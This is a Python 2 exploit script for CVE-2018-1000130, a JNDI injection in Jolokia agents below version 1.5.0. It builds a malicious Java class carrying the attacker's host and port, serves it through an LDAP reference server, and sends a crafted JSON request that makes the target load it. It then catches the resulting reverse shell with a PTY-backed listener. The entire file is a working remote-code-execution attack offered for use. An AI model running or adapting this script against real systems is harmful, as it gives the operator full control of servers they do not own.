#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#                                                                                                              #
#▄▄▄██▀▀▀▒█████   ██▓     ▒█████   ██ ▄█▀ ██▓ ▄▄▄      ▄▄▄██▀▀▀███▄    █ ▓█████▄  ██▓ ██▀███   ▄████▄  ▓█████  #
#▒██  ▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▄█▒ ▓██▒▒████▄      ▒██   ██ ▀█   █ ▒██▀ ██▌▓██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀    #
#░██  ▒██░  ██▒▒██░    ▒██░  ██▒▓███▄░ ▒██▒▒██  ▀█▄    ░██  ▓██  ▀█ ██▒░██   █▌▒██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███      #
#▓██▄██▓ ▒██   ██░▒██░    ▒██   ██░▓██ █▄ ░██░░██▄▄▄▄██▓██▄██▓ ▓██▒  ▐▌██▒░▓█▄   ▌░██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ #
#▓███▒  ░ ████▓▒░░██████▒░ ████▓▒░▒██▒ █▄░██░ ▓█   ▓██▒▓███▒  ▒██░   ▓██░░▒████▓ ░██░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒ #
#▒▓▒▒░  ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▓   ▒▒   ▓▒█░▒▓▒▒░  ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░ #
#▒ ░▒░    ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░▒ ▒░ ▒ ░  ▒   ▒▒ ░▒ ░▒░  ░ ░░   ░ ▒░ ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░ #
#░ ░ ░  ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░░ ░  ▒ ░  ░   ▒   ░ ░ ░     ░   ░ ░  ░ ░  ░  ▒ ░  ░░   ░ ░           ░    #
#░   ░      ░ ░      ░  ░    ░ ░  ░  ░    ░        ░  ░░   ░           ░    ░     ░     ░     ░ ░         ░  ░ #
#░                   ░                                                                                         #
# jolokia_jndi_rce - nighter                                                                                   #
#                                                                                                              #
# DATE                                                                                                         #
# 20/05/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# CVE-2018-1000130 - A JNDI Injection vulnerability exists in Jolokia agent version < 1.5.0 in the proxy mode  #
# that allows a remote attacker to run arbitrary Java code on the server.                                      #
#                                                                                                              #
# Creds to this blog that made exploitdev trivial                                                              #
# https://blog.gdssecurity.com/labs/2018/4/18/jolokia-vulnerabilities-rce-xss.html                             #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time

from multiprocessing import Process
from shutil import copyfile
from requests import post

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def prepare_payload():

    _workdir = sys.path[0]

    if os.path.isfile('src/main/java/ExportObject.java') is False:
        print("ERROR missing src/main/java/ExportObject.java")
        sys.exit(1)

    if os.path.isfile('target/ldaprefserver.jar') is False:
        print("ERROR missing ldaprefserver.jar")
        sys.exit(1)

    # Ugly but this was the easiest way I could find
    # so why not keep it simple this just works.
    print "[+] Preparing payload"
    copyfile('src/main/java/ExportObject.java', 'target/ExportObject.java')
    os.system("sed -ri 's/([0-9]{1,3}\.){3}[0-9]{1,3}/%s/' target/ExportObject.java" % LHOST)
    os.system("sed -ri 's/[0-9]{4}/%s/' target/ExportObject.java" % LPORT)
    os.chdir('target')
    os.system("javac ExportObject.java")
    os.system("jar uf ldaprefserver.jar ExportObject.class")
    os.chdir(_workdir)


def start_ldaprefserver():
    os.system("java -jar target/ldaprefserver.jar %s" % LHOST)


def exploit():

    time.sleep(5)
    print "[+] Exploit"
    data = "{\"type\":\"read\",\"mbean\":\"java.lang:type=Memory\",\"target\":{\"url\":\"service:jmx:rmi:///jndi/ldap://%s:9092/jmxrmi\"}}" % LHOST
    post('http://localhost:8080/jolokia', data=data)

# noinspection PyInterpreter
if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
 ▐▄▄▄      ▄▄▌        ▄ •▄ ▪   ▄▄▄·  ▐▄▄▄ ▐ ▄ ·▄▄▄▄  ▪  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▪     ██•  ▪     █▌▄▌▪██ ▐█ ▀█   ·██•█▌▐███▪ ██ ██ ▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██ ▄█▀▄ ██▪   ▄█▀▄ ▐▀▀▄·▐█·▄█▀▀█ ▪▄ ██▐█▐▐▌▐█· ▐█▌▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█▌.▐▌▐█▌▐▌▐█▌.▐▌▐█.█▌▐█▌▐█ ▪▐▌▐▌▐█▌██▐█▌██. ██ ▐█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀█▄▀▪.▀▀▀  ▀█▄▀▪·▀  ▀▀▀▀ ▀  ▀  ▀▀▀•▀▀ █▪▀▀▀▀▀• ▀▀▀.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    """)
        print "Usage: %s <URL> <LHOST> <LPORT>" % (sys.argv[0])
        print "\nEXAMPLE: ./jolokia_jndi_rce.py 'http://127.0.0.1:8080' 10.10.14.24 7777\n"
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    print "[+] LHOST = %s" % LHOST

    prepare_payload()

    # Run ldap server async
    p = Process(target=start_ldaprefserver)
    p.start()

    # Run ldap server async
    p = Process(target=exploit)
    p.start()

    # Start listener
    print("[+] Shell listen")
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
